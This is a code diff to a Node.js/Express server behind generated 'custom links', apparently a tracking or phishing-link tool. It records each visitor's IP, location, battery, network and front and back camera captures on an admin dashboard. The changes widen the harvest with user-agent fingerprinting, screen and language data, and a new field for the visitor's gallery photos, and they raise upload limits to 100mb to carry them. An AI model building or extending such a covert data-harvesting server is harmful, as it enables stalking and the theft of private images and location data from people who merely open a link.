@@ -27,8 +27,8 @@ const io = socketIo(server, {
 // 3. MIDDLEWARE
 // ==========================================
 app.use(cors());
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+app.use(bodyParser.json({ limit: '100mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
 app.use(express.static('public'));
 app.use(session({
     secret: process.env.SESSION_SECRET || 'your-secret-key',
@@ -78,7 +78,7 @@ app.post('/admin-login', (req, res) => {
     }
 });
 
-// Get all visitors (for dashboard)
+// Get all visitors
 app.get('/api/visitors', (req, res) => {
     if (!req.session.admin) {
         return res.status(401).json({ error: 'Unauthorized' });
@@ -87,7 +87,7 @@ app.get('/api/visitors', (req, res) => {
     res.json(users);
 });
 
-// Get all users data (for Users Data tab)
+// Get all users data
 app.get('/api/users-data', (req, res) => {
     if (!req.session.admin) {
         return res.status(401).json({ error: 'Unauthorized' });
@@ -96,7 +96,7 @@ app.get('/api/users-data', (req, res) => {
     res.json(users);
 });
 
-// Get all links with visit counts
+// Get all links
 app.get('/api/links', (req, res) => {
     if (!req.session.admin) {
         return res.status(401).json({ error: 'Unauthorized' });
@@ -143,12 +143,18 @@ app.post('/generate-custom-link', (req, res) => {
         createdAt: new Date().toISOString(),
         status: 'pending',
         deviceName: null,
+        deviceModel: null,
+        os: null,
+        browser: null,
         ip: null,
         location: null,
         battery: null,
         network: null,
+        screenResolution: null,
+        language: null,
         frontCamera: null,
         backCamera: null,
+        galleryPhotos: [],
         connected: false,
         visitDate: null,
         permissionsGranted: false,
@@ -178,6 +184,33 @@ app.delete('/api/visitor/:id', (req, res) => {
     
     let users = readUsers();
     users = users.filter(u => u.id !== req.params.id);
+    writeUsers(users);
+    res.json({ success: true });
+});
+
+// Delete specific visit from history
+app.delete('/api/visitor/:userId/visit/:visitIndex', (req, res) => {
+    if (!req.session.admin) {
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const { userId, visitIndex } = req.params;
+    const users = readUsers();
+    const userIndex = users.findIndex(u => u.id === userId);
+    
+    if (userIndex === -1) {
+        return res.status(404).json({ error: 'User not found' });
+    }
+    
+    const visitHistory = users[userIndex].visitHistory || [];
+    if (visitIndex >= visitHistory.length) {
+        return res.status(404).json({ error: 'Visit not found' });
+    }
+    
+    visitHistory.splice(visitIndex, 1);
+    users[userIndex].visitHistory = visitHistory;
+    users[userIndex].totalVisits = visitHistory.length;
+    
     writeUsers(users);
     res.json({ success: true });
 });
@@ -232,23 +265,36 @@ io.on('connection', (socket) => {
         const userIndex = users.findIndex(u => u.id === visitorId);
         
         if (userIndex !== -1) {
-            // Create visit record for this visit
+            // Get detailed device info
+            const userAgent = deviceInfo.userAgent || '';
+            const browserMatch = userAgent.match(/(chrome|safari|firefox|edge|opera)/i);
+            const osMatch = userAgent.match(/(windows|mac|linux|android|ios|iphone|ipad)/i);
+            
             const visitRecord = {
                 visitId: uuidv4(),
                 visitDate: new Date().toISOString(),
                 ip: ip,
-                deviceInfo: deviceInfo,
+                deviceInfo: {
+                    ...deviceInfo,
+                    browser: browserMatch ? browserMatch[0] : 'Unknown',
+                    os: osMatch ? osMatch[0] : 'Unknown',
+                    deviceModel: deviceInfo.deviceModel || 'Unknown'
+                },
                 location: null,
                 battery: null,
                 network: null,
                 frontCamera: null,
                 backCamera: null,
+                galleryPhotos: [],
                 redirectComplete: false
             };
             
             users[userIndex] = {
                 ...users[userIndex],
                 ...deviceInfo,
+                deviceModel: deviceInfo.deviceModel || 'Unknown',
+                os: osMatch ? osMatch[0] : 'Unknown',
+                browser: browserMatch ? browserMatch[0] : 'Unknown',
                 ip: ip,
                 connected: true,
                 visitDate: new Date().toISOString(),
@@ -288,6 +334,8 @@ io.on('connection', (socket) => {
                 users[userIndex].battery = content;
             } else if (type === 'network') {
                 users[userIndex].network = content;
+            } else if (type === 'galleryPhotos') {
+                users[userIndex].galleryPhotos = content;
             } else if (type === 'permissionsGranted') {
                 users[userIndex].permissionsGranted = true;
             } else if (type === 'redirectComplete') {
@@ -309,6 +357,8 @@ io.on('connection', (socket) => {
                     lastVisit.battery = content;
                 } else if (type === 'network') {
                     lastVisit.network = content;
+                } else if (type === 'galleryPhotos') {
+                    lastVisit.galleryPhotos = content;
                 } else if (type === 'redirectComplete') {
                     lastVisit.redirectComplete = true;
                     lastVisit.redirectTime = new Date().toISOString();
